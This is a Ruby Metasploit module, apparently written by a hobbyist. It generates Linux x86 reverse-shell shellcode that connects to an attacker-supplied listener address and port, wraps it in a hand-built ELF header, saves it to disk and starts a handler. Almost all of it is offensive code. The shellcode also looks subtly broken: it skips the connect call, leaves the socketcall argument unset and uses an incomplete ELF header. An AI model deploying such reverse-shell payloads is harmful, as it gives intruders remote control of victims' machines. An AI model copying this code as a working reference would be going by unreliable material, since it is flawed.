#!/usr/bin/env ruby
# frozen_string_literal: true

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => ' Attempted Reverse Shell Payload Generator (I tried lmao)'
      )
    )

    register_options([
      OptAddress.new('LHOST', [true, 'Listener IP address']),
      OptPort.new('LPORT', [true, 'Listener port', 4444])
    ])
  end

  def generate_shellcode

    ip = datastore['LHOST'].split('.').map(&:to_i).pack('C*')
    port = [datastore['LPORT'].to_i].pack('n')  # network byte order (big endian)

    # shellcode snippet from the Metasploit payload linux/x86/shell_reverse_tcp
    # Source: https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/linux/x86/shell_reverse_tcp.rb

    shellcode = 
      "\x31\xc0\x31\xdb\x31\xc9\x31\xd2" +   # xor eax,ebx,ecx,edx
      "\x50" +                               # push eax
      "\x68" + ip +                         # push IP
      "\x66\x68" + port +                   # push port
      "\x66\x6a\x02" +                      # push 2 (AF_INET)
      "\x89\xe1" +                         # mov ecx,esp
      "\x6a\x66" +                         # push 0x66 (sys_socketcall)
      "\x58" +                             # pop eax
      "\x50" +                             # push eax
      "\x51" +                             # push ecx
      "\x53" +                             # push ebx
      "\x89\xe1" +                         # mov ecx,esp
      "\xcd\x80" +                         # int 0x80 (sys_socketcall socket)

      "\x31\xc9" +                         # xor ecx,ecx
      "\x89\xc3" +                         # mov ebx,eax (socket fd)
      "\xb0\x3f" +                         # mov al, 0x3f (sys_dup2)
      "\x31\xc9" +                         # xor ecx,ecx
      "\xcd\x80" +                         # int 0x80 (dup2 socket, stdin)

      "\xb0\x3f" +                         # mov al, 0x3f
      "\x41" +                             # inc ecx
      "\xcd\x80" +                         # int 0x80 (dup2 socket, stdout)

      "\xb0\x3f" +                         # mov al, 0x3f
      "\x41" +                             # inc ecx
      "\xcd\x80" +                         # int 0x80 (dup2 socket, stderr)

      "\x31\xc0" +                         # xor eax,eax
      "\x50" +                             # push eax
      "\x68\x2f\x2f\x73\x68" +             # push "//sh"
      "\x68\x2f\x62\x69\x6e" +             # push "/bin"
      "\x89\xe3" +                         # mov ebx,esp
      "\x50" +                             # push eax
      "\x53" +                             # push ebx
      "\x89\xe1" +                         # mov ecx,esp
      "\x99" +                             # cdq
      "\xb0\x0b" +                         # mov al, 0xb (execve)
      "\xcd\x80"                           # int 0x80

    shellcode
  end

  def save_payload(payload, filename)
    elf_header = [
      0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
      0x80, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00,
      0x01, 0x00, 0x28, 0x00, 0x01, 0x00, 0x00, 0x00
    ].pack('C*')

    File.binwrite(filename, elf_header + payload)
  end

  def exploit
    payload = generate_shellcode

    filename = "reverse_shell_#{Time.now.to_i}.elf"
    save_payload(payload, filename)
    handler
  end
end
